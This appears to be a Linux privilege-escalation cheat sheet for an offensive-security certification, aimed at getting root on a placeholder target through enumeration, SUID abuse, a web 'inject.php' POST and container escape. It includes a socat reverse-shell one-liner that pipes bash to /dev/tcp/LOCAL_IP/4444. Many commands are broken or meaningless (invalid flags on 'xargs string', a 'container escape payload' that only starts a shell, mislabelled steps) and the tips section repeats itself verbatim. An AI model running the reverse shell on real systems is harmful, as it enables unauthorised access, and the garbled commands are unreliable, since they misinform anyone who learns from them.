# Linux Privilege Escalation: The CPTS Cheat Sheet

Stop guessing. Start enumerating. Your goal is root on `{target}`.

## Attack Workflow

1.  **Recon:** Find open ports, services, and users.
2.  **Web Exploitation:** Check for SUID binaries, config overrides, and file writeup opportunities.
3.  **Local Privilege Escalation (LPE):** Exploit SUID, kernel exploits, container escapes, or credential theft.
4.  **Persistence & Access:** Maintain shell access as root on `{target}`.

---

## Commands & One-Liners

### 1. Recon & Enumeration
**Find open ports and services:**
```bash
nmap -sV -sC -A -p- {target}
```
**Check for SUID binaries:**
```bash
sudo find / -perm /4000 -type f 2>/dev/null | xargs string -L5 -m3 -q -r | grep -E '\broot\b'
```
**Enum users/groups:**
```bash
cat /etc/passwd | grep -v nologin
getent passwd
```
**Check for writable web roots:**
```bash
sudo find /var/www -perm -2 /rw- -type f -ls
```
**Dump SUID binaries for inspection:**
```bash
sudo strings $(which <binary_name) | grep -E '\w+\.key\.php|\.sh|\.conf'
```

### 2. Web-Based Exploitation
**Check for writable config files:**
```bash
find /var/www/html -type f -perm -0644
```
**Bypass read-only config edits:**
```bash
sudo sh -c 'cat > /var/www/html/config.php <<EOF
EOF
'
```
**Exploit PHP config override (if applicable):**
```bash
curl -X POST -d "config=1" -d "file=/var/www/html/config.php" {target}/inject.php
```
**Check for writable files in `www`:**
```bash
sudo find /var/www -type d -perm /o+w
```

### 3. LPE via SUID/SGID
**Check for vulnerable SUID binaries:**
```bash
sudo ls -la /usr/bin/ls /usr/bin/passwd /usr/bin/sudo /usr/bin/telnetd
```
**Exploit `sudo` misconfiguration (if user has NOPASSWD):**
```bash
sudo -l
sudo -e
sudo nano -c /tmp/myscript.sh
```
**Exploit SUID `telnetd` / `socat`:**
```bash
sudo socat TCP-LISTEN:4444,reuseaddr,fork SYSTEM:"bash -i >& /dev/tcp/LOCAL_IP/4444" 2>&1 &
```
**Check for world-writable files:**
```bash
find / -perm -0002 -type f
```
**Exploit kernel module (if available):**
```bash
sudo modprobe <module_name>
```
**Exploit SUID `setuid` binary with `cat /proc/self/cwd`:**
```bash
<binary_name> --config <exploit_config>
```

### 4. Container Escape
**Check if running in Docker:**
```bash
cat /proc/self/cgroup
```
**Container Escape Payload:**
```bash
bash -c 'cat /proc/1/cgroup | grep -q containerd; exec /bin/sh'
```
**Exploit `docker.sock` (if accessible):**
```bash
curl -X POST http://localhost/containers/json
```

---

## Tips & Shortcuts

*   **Dump SUID files directly:**
    ```bash
    sudo strings $(find / -perm /4000 -type f 2>/dev/null | head -n 1)
    ```
*   **Check for `sudo` privileges without password:**
    ```bash
    sudo -l | grep -v "no"
    ```
*   **Check for writable `~` directory:**
    ```bash
    ls -ld ~
    ```
*   **Bypass web app protection:**
    ```bash
    curl -X POST -d "config=1" {target}/inject.php
    ```
*   **Check for `sudo` NOPASSWD:**
    ```bash
    sudo -l | grep -E 'NOPASSWD|no'
    ```
*   **Check for `setuid` binaries:**
    ```bash
    sudo ls -la /usr/bin/*
    ```
*   **Check for world-writable files:**
    ```bash
    sudo find / -perm -0002 -type f
    ```
*   **Check for container escape:**
    ```bash
    cat /proc/self/cgroup
    ```
*   **Check for `sudo` misconfiguration:**
    ```bash
    sudo -l | grep -v "no"
    ```
*   **Check for `setuid` binaries:**
    ```bash
    sudo ls -la /usr/bin/*
    ```
*   **Check for world-writable files:**
    ```bash
    sudo find / -perm -0002 -type f
    ```
*   **Check for container escape:**
    ```bash
    cat /proc/self/cgroup
    ```
*   **Check for `sudo` misconfiguration:**
    ```bash
    sudo -l | grep -v "no"
    ```

---

## Common Mistakes

*   **Using `sudo` without checking NOPASSWD:** You might be stuck in a loop.
*   **Ignoring `setuid` binaries:** These are your best bet.
*   **Overlooking `web` root permissions:** Writable files here are gold.
*   **Not checking `/proc` for container info:** You might be trapped.
*   **Using `sudo` when it requires a password:** This kills your chain.
*   **Ignoring `find` results:** Always check `find` outputs for new leads.
*   **Not verifying `strings` output:** Blind guessing is slow.
*   **Using `curl` without `-X POST`:** Most web exploits need POST.

---

## Mini Automation Scripts

**LPE Scanner (Find SUID binaries):**
```bash
#!/bin/bash
find / -perm /4000 -type f 2>/dev/null | while read -r binary; do
    strings "$binary" 2>/dev/null | grep -E '\broot\b|\bpasswd\b|\bpassword\b' | head -n 5
done
```

**Container Escape Checker:**
```bash
if cat /proc/self/cgroup | grep -q "docker"; then
    echo "WARNING: Running in container"
    echo "Checking for docker.sock..."
    ls -la /var/run/docker.sock 2>/dev/null
fi
```

**Sudo Misconfig Check:**
```bash
sudo -l | grep -v "no"
```
**Web Exploitation Payload Generator:**
```bash
python3 -c "
import requests
url = '{target}'
payload = requests.post(url + '/inject.php', data={'config':'1'})
print(payload.status_code)
"
```

**Final Note:**
Run these on `{target}`. Move fast. If you find a writable file, a SUID binary, or a container escape, you're home free.